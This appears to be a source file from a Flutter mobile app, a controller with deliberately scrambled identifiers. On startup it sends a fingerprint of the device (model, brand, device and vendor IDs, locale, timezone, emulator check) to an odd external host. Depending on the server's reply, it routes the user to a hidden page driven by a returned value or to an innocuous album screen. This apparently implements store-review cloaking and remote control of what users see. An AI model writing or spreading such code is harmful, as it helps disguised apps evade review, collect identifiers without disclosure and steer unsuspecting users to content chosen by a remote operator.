import 'dart:convert';
import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

class PageLogic extends GetxController {

  var whsolqrtpf = RxBool(false);
  var hgdolbw = RxBool(true);
  var tlcshpk = RxString("");
  var deontae = RxBool(false);
  var leuschke = RxBool(true);
  final adxghewrnp = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    ozsdpv();
  }


  Future<void> ozsdpv() async {

    deontae.value = true;
    leuschke.value = true;
    hgdolbw.value = false;

    adxghewrnp.post("https://ke.eaterip.xyz/QSAJUCEJW",data: await lfshjxc()).then((value) {
      var oldteqxu = value.data["oldteqxu"] as String;
      var umtcqfge = value.data["umtcqfge"] as bool;
      if (umtcqfge) {
        tlcshpk.value = oldteqxu;
        helen();
      } else {
        boyer();
      }
    }).catchError((e) {
      hgdolbw.value = true;
      leuschke.value = true;
      deontae.value = false;
    });
  }

  Future<Map<String, dynamic>> lfshjxc() async {
    final DeviceInfoPlugin uzmotqk = DeviceInfoPlugin();
    PackageInfo yeiotjvh_lfbaw = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var rmvo = Platform.localeName;
    var rwliszbx = currentTimeZone;

    var dxog = yeiotjvh_lfbaw.packageName;
    var aqrcf = yeiotjvh_lfbaw.version;
    var ckgbzr = yeiotjvh_lfbaw.buildNumber;

    var vdgbksh = yeiotjvh_lfbaw.appName;
    var patwclej = "";
    var itdmk = "";
    var christinaGrimes = "";
    var felanh  = "";
    var anabelWiza = "";
    var heidiQuigley = "";
    var lailaStokes = "";
    var desireeCarter = "";
    var zoraLueilwitz = "";


    var nuwldq = "";
    var ewli = false;

    if (GetPlatform.isAndroid) {
      nuwldq = "android";
      var soxhurk = await uzmotqk.androidInfo;

      itdmk = soxhurk.brand;

      patwclej  = soxhurk.model;
      felanh = soxhurk.id;

      ewli = soxhurk.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      nuwldq = "ios";
      var sdcxkz = await uzmotqk.iosInfo;
      itdmk = sdcxkz.name;
      patwclej = sdcxkz.model;

      felanh = sdcxkz.identifierForVendor ?? "";
      ewli  = sdcxkz.isPhysicalDevice;
    }

    var res = {
      "heidiQuigley" : heidiQuigley,
      "vdgbksh": vdgbksh,
      "dxog": dxog,
      "patwclej": patwclej,
      "rwliszbx": rwliszbx,
      "itdmk": itdmk,
      "desireeCarter" : desireeCarter,
      "felanh": felanh,
      "ckgbzr": ckgbzr,
      "nuwldq": nuwldq,
      "ewli": ewli,
      "zoraLueilwitz" : zoraLueilwitz,
      "anabelWiza" : anabelWiza,
      "rmvo": rmvo,
      "lailaStokes" : lailaStokes,
      "christinaGrimes" : christinaGrimes,
      "aqrcf": aqrcf,

    };
    return res;
  }

  Future<void> boyer() async {
    Get.offAllNamed("/album_tab");
  }

  Future<void> helen() async {
    Get.offAllNamed("/rule_back");
  }

}
